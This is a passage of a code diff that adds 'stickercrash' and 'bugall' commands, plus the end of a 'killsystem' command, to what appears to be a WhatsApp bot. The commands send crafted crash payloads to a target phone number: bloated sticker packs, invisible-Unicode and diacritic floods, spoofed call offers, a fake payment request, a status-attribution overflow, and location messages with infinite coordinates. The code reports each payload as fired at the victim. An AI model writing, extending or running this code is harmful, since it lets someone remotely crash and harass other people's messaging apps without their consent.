+                  _ksStkCreate("3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp"),
+                ],
+                fileLength: "999999", fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
+                fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
+                mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=", mediaKeyTimestamp: "1741150286",
+                directPath: "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc",
+                trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
+                thumbnailDirectPath: "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc",
+                thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
+                thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
+                thumbnailHeight: 252, thumbnailWidth: 252,
+                imageDataHash: "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
+                stickerPackSize: "999999999", stickerPackOrigin: "1",
+                contextInfo: {
+                  quotedMessage: {
+                    paymentInviteMessage: { serviceType: 3, expiryTimestamp: Date.now() + 1814400000 },
+                    forwardedAiBotMessageInfo: { botName: "META AI", botJid: `${Math.floor(Math.random()*5000000)}@s.whatsapp.net`, creatorName: "Bot" }
+                  }
+                }
+              }
+            }, { participant: { jid: _ksJid } }).catch(()=>{});
+
+            await socket.sendMessage(sender, { text: `✅ *KILLSYSTEM COMPLETE*\n\n👤 *Target:* +${_ksNum}\n☠️ _All 4 crash payloads delivered._` }, { quoted: msg });
+          } catch (e) {
+            console.error('[KILLSYSTEM CMD]', e);
+            await socket.sendMessage(sender, { text: '❌ Killsystem error: ' + e.message }, { quoted: msg });
+          }
+          break;
+        }
+
+        // ─────────────────────── STICKERCRASH ───────────────────────
+        case 'stickercrash':
+        case 'stkcrash':
+        case 'sc': {
+          try {
+            if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '❌ Owner only command.' }, { quoted: msg });
+            const _scRaw = msg.message?.extendedTextMessage?.contextInfo?.participant ||
+              (args[0] ? `${args[0].replace(/[^0-9]/g, '')}@s.whatsapp.net` : null);
+            if (!_scRaw) return await socket.sendMessage(sender, { text: `❌ *Usage:* ${config.PREFIX}stickercrash <number>\n_Example:_ ${config.PREFIX}stickercrash 9471xxxxxxx` }, { quoted: msg });
+            const _scJid = _scRaw.includes('@') ? _scRaw : `${_scRaw.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
+            const _scNum = _scJid.replace('@s.whatsapp.net', '');
+            await socket.sendMessage(sender, { text: `🃏 *STICKERCRASH INITIATED*\n\n👤 *Target:* +${_scNum}\n🔥 _Sending bloated sticker pack crash payload..._` }, { quoted: msg });
+            const _scMkStk = (n) => ({ fileName: n, isAnimated: false, isLottie: true, mimetype: "application/pdf", emojis: ["🀄"], accessibilityLabel: "FlowX" });
+            await socket.relayMessage(_scJid, {
+              stickerPackMessage: {
+                stickerPackId: "X",
+                name: "./Lolipop" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
+                publisher: "./Lolipop" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
+                packDescription: "./Lolipop" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
+                stickers: [
+                  _scMkStk("FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp"),
+                  _scMkStk("KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp"),
+                  _scMkStk("wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp"),
+                  _scMkStk("jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp"),
+                  _scMkStk("ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp"),
+                  _scMkStk("1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp"),
+                  _scMkStk("3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp"),
+                  _scMkStk("1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp"),
+                  _scMkStk("5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp"),
+                  _scMkStk("3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp"),
+                ],
+                fileLength: "999999", fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
+                fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
+                mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=", mediaKeyTimestamp: "1741150286",
+                directPath: "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc",
+                trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
+                thumbnailDirectPath: "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc",
+                thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
+                thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
+                thumbnailHeight: 252, thumbnailWidth: 252,
+                imageDataHash: "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
+                stickerPackSize: "999999999", stickerPackOrigin: "1",
+                contextInfo: {
+                  quotedMessage: {
+                    paymentInviteMessage: { serviceType: 3, expiryTimestamp: Date.now() + 1814400000 },
+                    forwardedAiBotMessageInfo: { botName: "META AI", botJid: `${Math.floor(Math.random()*5000000)}@s.whatsapp.net`, creatorName: "Bot" }
+                  }
+                }
+              }
+            }, { participant: { jid: _scJid } });
+            await socket.sendMessage(sender, { text: `✅ *STICKERCRASH SENT*\n\n👤 *Target:* +${_scNum}\n🃏 _Sticker pack overflow payload delivered._` }, { quoted: msg });
+          } catch (e) {
+            console.error('[STICKERCRASH CMD]', e);
+            await socket.sendMessage(sender, { text: '❌ StickerCrash error: ' + e.message }, { quoted: msg });
+          }
+          break;
+        }
+
+        // ─────────────────────── BUGALL ───────────────────────
+        case 'bugall':
+        case 'allbug':
+        case 'fullcrash': {
+          try {
+            if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '❌ Owner only command.' }, { quoted: msg });
+            const _baRaw = msg.message?.extendedTextMessage?.contextInfo?.participant ||
+              (args[0] ? `${args[0].replace(/[^0-9]/g, '')}@s.whatsapp.net` : null);
+            if (!_baRaw) return await socket.sendMessage(sender, {
+              text: `☠️ *Usage:* ${config.PREFIX}bugall <number>\n_Example:_ ${config.PREFIX}bugall 9471xxxxxxx\n\n_Fires all 8 crash payloads sequentially against one target._`
+            }, { quoted: msg });
+            const _baJid = _baRaw.includes('@') ? _baRaw : `${_baRaw.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
+            const _baNum = _baJid.replace('@s.whatsapp.net', '');
+
+            await socket.sendMessage(sender, {
+              text: `☠️ *BUGALL INITIATED*\n\n👤 *Target:* +${_baNum}\n💀 *Payloads:* 8 crash methods\n🔥 _Firing all bugs sequentially..._\n\n1️⃣ Ultra Crash\n2️⃣ Call Bug\n3️⃣ Call Crash\n4️⃣ Crashfinity\n5️⃣ Crashjam\n6️⃣ iOS Invisible\n7️⃣ Sticker Crash\n8️⃣ Kill System`
+            }, { quoted: msg });
+
+            // ── 1. Ultra Crash (from .bug — invisible unicode flood) ──
+            try {
+              const _inv = '\u200B\u200C\u200D\uFEFF\u2060\u180E\u00AD\u034F';
+              const _mkInv = (n) => Array.from({length:n},(_,i)=>_inv[i%_inv.length]).join('');
+              const _diac = '\u0300\u0301\u0302\u0303\u0304\u0305\u0488\u0489\u20D0\u20D1\u20D2\u20D6\u20D7\u20DB';
+              const _txtA = _mkInv(500) + _diac.repeat(6000) + '\u200D'.repeat(8000) + _mkInv(1000);
+              const _txtE = '\u200B'.repeat(4000)+'\u200C'.repeat(4000)+'\u200D'.repeat(4000)+'\uFEFF'.repeat(4000)+'\u2060'.repeat(4000);
+              const _mid1 = '3EB0' + crypto.randomBytes(18).toString('hex').toUpperCase();
+              await socket.relayMessage(_baJid, { conversation: _txtA }, { messageId: _mid1, participant: { jid: _baJid } }).catch(()=>{});
+              await delay(400);
+              const _mid2 = '3EB0' + crypto.randomBytes(18).toString('hex').toUpperCase();
+              await socket.relayMessage(_baJid, { conversation: _txtE }, { messageId: _mid2, participant: { jid: _baJid } }).catch(()=>{});
+              await socket.sendMessage(sender, { react: { text: '1️⃣', key: msg.key } });
+            } catch(e) {}
+            await delay(600);
+
+            // ── 2. Call Bug (simultaneous call offer) ──
+            try {
+              const _cbId = Array.from({length:12},()=>Math.floor(Math.random()*16).toString(16)).join('');
+              const _cbCreator = socket.user.id;
+              await socket.query({
+                tag: 'call', attrs: { from: _cbCreator, to: _baJid },
+                content: [{ tag: 'offer', attrs: { 'call-id': _cbId, 'call-creator': _cbCreator }, content: undefined }]
+              }).catch(()=>{});
+              await delay(3000);
+              await socket.query({
+                tag: 'call', attrs: { from: _cbCreator, to: _baJid },
+                content: [{ tag: 'terminate', attrs: { 'call-id': _cbId, 'call-creator': _cbCreator, reason: 'timeout' }, content: undefined }]
+              }).catch(()=>{});
+              await socket.sendMessage(sender, { react: { text: '2️⃣', key: msg.key } });
+            } catch(e) {}
+            await delay(500);
+
+            // ── 3. Call Crash (bare call offer stanza) ──
+            try {
+              const _ccId2 = Array.from({length:12},()=>Math.floor(Math.random()*16).toString(16)).join('');
+              await socket.query({
+                tag: 'call', attrs: { from: socket.user.id, to: _baJid },
+                content: [{ tag: 'offer', attrs: { 'call-id': _ccId2, 'call-creator': socket.user.id }, content: undefined }]
+              }).catch(()=>{});
+              await socket.sendMessage(sender, { react: { text: '3️⃣', key: msg.key } });
+            } catch(e) {}
+            await delay(500);
+
+            // ── 4. Crashfinity (fake payment) ──
+            try {
+              const _cfSpam2 = "ြ".repeat(1500);
+              await socket.relayMessage(_baJid, {
+                requestPaymentMessage: {
+                  currencyCodeIso4217: "IDR", requestFrom: _baJid,
+                  expiryTimestamp: Date.now() + 8000,
+                  amount: { value: 999999999, offset: 100, currencyCode: "IDR" },
+                  contextInfo: {
+                    externalAdReply: {
+                      title: "HAI SALAM KENAL YAKK", body: _cfSpam2, mimetype: "audio/mpeg",
+                      caption: _cfSpam2, showAdAttribution: true,
+                      sourceUrl: "https://t.me/zuckyyu",
+                      thumbnailUrl: "https://files.catbox.moe/tlbp3k.jpg"
+                    }
+                  }
+                }
+              }, { participant: { jid: _baJid }, messageId: null, userJid: _baJid, quoted: null }).catch(()=>{});
+              await socket.sendMessage(sender, { react: { text: '4️⃣', key: msg.key } });
+            } catch(e) {}
+            await delay(600);
+
+            // ── 5. Crashjam (status attribution overflow) ──
+            try {
+              const _cjPool2 = ['41','91','90','31','40'];
+              const _cjAttribs2 = Array.from({ length: 50000 }, () => ({
+                participant: `${_cjPool2[Math.floor(Math.random()*5)]}${Math.floor(Math.random()*1e10).toString().padStart(10,'0')}@s.whatsapp.net`,
+                type: 1
+              }));
+              await socket.relayMessage("status@broadcast", {
+                viewOnceMessage: {
+                  message: {
+                    messageContextInfo: { messageSecret: crypto.randomBytes(32), deviceListMetadata: { senderKeyIndex: 0, senderTimestamp: Date.now(), recipientKeyIndex: 0 } },
+                    interactiveResponseMessage: {
+                      contextInfo: {
+                        remoteJid: "status@broadcast", fromMe: true, isQuestion: true,
+                        forwardedAiBotMessageInfo: { botJid: "13135550202@bot", botName: "Business Assistant", creator: "FLIX" },
+                        statusAttributionType: 2, statusAttributions: _cjAttribs2
+                      },
+                      body: { text: "", format: "DEFAULT" },
+                      nativeFlowResponseMessage: { name: "call_permission_request", paramsJson: "kkk", version: 3 }
+                    }
+                  }
+                }
+              }, {
+                statusJidList: [_baJid],
+                additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: _baJid } }] }] }]
+              }).catch(()=>{});
+              await socket.sendMessage(sender, { react: { text: '5️⃣', key: msg.key } });
+            } catch(e) {}
+            await delay(800);
+
+            // ── 6. iOS Invisible (location + extendedText via status) ──
+            try {
+              const _iiRep = "𑇂𑆵𑆴𑆿𑆿";
+              const _iiLocM = generateWAMessageFromContent(_baJid, {
+                viewOnceMessage: { message: { locationMessage: {
+                  degreesLatitude: -9.09999262999, degreesLongitude: 199.99963118999, jpegThumbnail: null,
+                  name: "\u0000" + _iiRep.repeat(15000),
+                  address: "\u0000" + _iiRep.repeat(10000),
+                  url: `https://kominfo.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`
+                }}}
+              }, {});
+              await socket.relayMessage('status@broadcast', _iiLocM.message, {
+                messageId: _iiLocM.key.id, statusJidList: [_baJid],
+                additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: _baJid }, content: undefined }] }] }]
+              }).catch(()=>{});
+              await socket.sendMessage(sender, { react: { text: '6️⃣', key: msg.key } });
+            } catch(e) {}
+            await delay(600);
+
+            // ── 7. Sticker Crash ──
+            try {
+              const _baMkStk = (n) => ({ fileName: n, isAnimated: false, isLottie: true, mimetype: "application/pdf", emojis: ["🀄"], accessibilityLabel: "FlowX" });
+              await socket.relayMessage(_baJid, {
+                stickerPackMessage: {
+                  stickerPackId: "X",
+                  name: "./Lolipop" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
+                  publisher: "./Lolipop" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
+                  packDescription: "./Lolipop" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
+                  stickers: [
+                    _baMkStk("FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp"),
+                    _baMkStk("KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp"),
+                    _baMkStk("wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp"),
+                    _baMkStk("jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp"),
+                    _baMkStk("ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp"),
+                    _baMkStk("1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp"),
+                    _baMkStk("3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp"),
+                    _baMkStk("1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp"),
+                    _baMkStk("5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp"),
+                    _baMkStk("3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp"),
+                  ],
+                  fileLength: "999999", fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
+                  fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
+                  mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=", mediaKeyTimestamp: "1741150286",
+                  directPath: "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc",
+                  trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
+                  thumbnailDirectPath: "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc",
+                  thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
+                  thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
+                  thumbnailHeight: 252, thumbnailWidth: 252,
+                  imageDataHash: "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
+                  stickerPackSize: "999999999", stickerPackOrigin: "1",
+                  contextInfo: {
+                    quotedMessage: {
+                      paymentInviteMessage: { serviceType: 3, expiryTimestamp: Date.now() + 1814400000 },
+                      forwardedAiBotMessageInfo: { botName: "META AI", botJid: `${Math.floor(Math.random()*5000000)}@s.whatsapp.net`, creatorName: "Bot" }
+                    }
+                  }
+                }
+              }, { participant: { jid: _baJid } }).catch(()=>{});
+              await socket.sendMessage(sender, { react: { text: '7️⃣', key: msg.key } });
+            } catch(e) {}
+            await delay(600);
+
+            // ── 8. Kill System (newsletter + location + button + sticker chain) ──
+            try {
+              const _ksUw2 = "ោ៝".repeat(10000);
+              const _ksUz2 = "ꦾ".repeat(10000);
+              await socket.relayMessage(_baJid, {
+                newsletterAdminInviteMessage: {
+                  newsletterJid: "1234567891234@newsletter",
+                  newsletterName: "STATUS KING" + "ោ៝".repeat(20000),
+                  caption: "🩸" + _ksUw2 + _ksUz2,
+                  inviteExpiration: "90000",
+                  contextInfo: { participant: "0@s.whatsapp.net", remoteJid: "status@broadcast", mentionedJid: ["0@s.whatsapp.net"] }
+                }
+              }, { participant: { jid: _baJid }, messageId: null }).catch(()=>{});
+              await delay(500);
+              const _ksOw2 = "ꦾ".repeat(61111);
+              await socket.relayMessage(_baJid, {
+                locationMessage: {
+                  degreesLatitude: Infinity, degreesLongitude: -Infinity,
+                  name: "‼️⃟ STATUS KING " + _ksOw2, inviteLinkGroupTypeV2: "DEFAULT",
+                  url: "https://crash." + _ksOw2 + ".com/",
+                  contextInfo: {
+                    mentionedJid: [_baJid, "0@s.whatsapp.net"],
+                    quotedMessage: { paymentInviteMessage: { serviceType: 3, expiryTimestamp: -Infinity * Infinity } },
+                    nativeFlowMessage: { messageParamsJson: "{".repeat(10000) }
+                  }
+                }
+              }, { participant: { jid: _baJid } }).catch(()=>{});
+              await socket.sendMessage(sender, { react: { text: '8️⃣', key: msg.key } });
+            } catch(e) {}
+
+            await socket.sendMessage(sender, {
+              text: `✅ *BUGALL COMPLETE* ☠️\n\n👤 *Target:* +${_baNum}\n💀 *All 8 crash payloads fired:*\n\n1️⃣ Ultra Crash ✓\n2️⃣ Call Bug ✓\n3️⃣ Call Crash ✓\n4️⃣ Crashfinity ✓\n5️⃣ Crashjam ✓\n6️⃣ iOS Invisible ✓\n7️⃣ Sticker Crash ✓\n8️⃣ Kill System ✓\n\n> _STATUS KING 💀_`
+            }, { quoted: msg });
+          } catch (e) {
+            console.error('[BUGALL CMD]', e);
+            await socket.sendMessage(sender, { text: '❌ BugAll error: ' + e.message }, { quoted: msg });
+          }
           break;
         }
 
